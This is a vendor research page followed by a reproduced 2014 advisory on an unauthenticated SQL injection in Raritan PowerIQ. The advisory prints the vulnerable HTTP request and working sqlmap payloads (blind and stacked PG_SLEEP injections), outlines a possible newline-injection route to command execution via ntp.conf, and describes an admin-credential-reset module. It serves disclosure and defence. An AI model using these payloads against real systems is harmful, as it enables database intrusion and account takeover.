How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

# Raritan PowerIQ v4.10 and v4.2.1 Unauthenticated SQL injection and possible RCE

---

*From*: Brandon Perry <bperry.volatile () gmail com>

*Date*: Wed, 16 Jul 2014 14:14:27 -0500

---

```
Raritan PowerIQ suffers from an unauthenticated SQL injection vulnerability
within an endpoint used during initial configuration of the licensing for
the product. This endpoint is still available after the appliance has been
fully configured.

POST /license/records HTTP/1.1

Host: 192.168.1.11

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:26.0)
Gecko/20100101 Firefox/26.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

X-Requested-With: XMLHttpRequest

Content-Type: application/x-www-form-urlencoded; charset=UTF-8

Referer: <https://192.168.1.11/license>

Content-Length: 15

Connection: keep-alive

Pragma: no-cache

Cache-Control: no-cache

sort=id&dir=ASC

Both the 'sort' and 'dir' parameters are vulnerable.

sqlmap identified the following injection points with a total of 1173
HTTP(s) requests:
---
Place: POST
Parameter: sort
    Type: boolean-based blind
    Title: Generic boolean-based blind - GROUP BY and ORDER BY clauses
    Payload: sort=id,(SELECT (CASE WHEN (6357=6357) THEN 1 ELSE 1/(SELECT
0) END))&dir=ASC

    Type: stacked queries

    Payload: sort=id&dir=ASC; SELECT PG_SLEEP(5)--

    Payload: sort=id&dir=ASC,(SELECT (CASE WHEN (1501=1501) THEN (SELECT
1501 FROM PG_SLEEP(5)) ELSE 1/(SELECT 0) END))
---

There may also be a remote command execution vulnerability available to
administrators (or you if you use the stacked injection to update the
hashes).

When saving an NTP server, you can inject a newline (%0a) into the request
in order to save a malformed 'server' stanza in the ntp.conf. When syncing
with NTP, the application passes the first NTP server to the NTP utility
via bash. I was not able to make my malformed NTP server available as the
first in the list, thus was not able to achieve RCE. There may be a way to
do it though that I am unaware of.

Attached is a Metasploit module that I began writing when attempting to
achieve RCE but was never able to. This module will

A) Pull out the current password hash and salt for the 'admin' user and
cache them.
B) Update the admin creeds to be 'admin:Passw0rd!'
C) Set up the malformed NTP server
D) Attempt to sync with NTP.

Because I was not able to achieve RCE via that vector, this module does not
actually pop a shell, so I am sorry about that. :)

Maybe some PostgreSQL UDF fanciness will be the key.

You may also find the module available here:
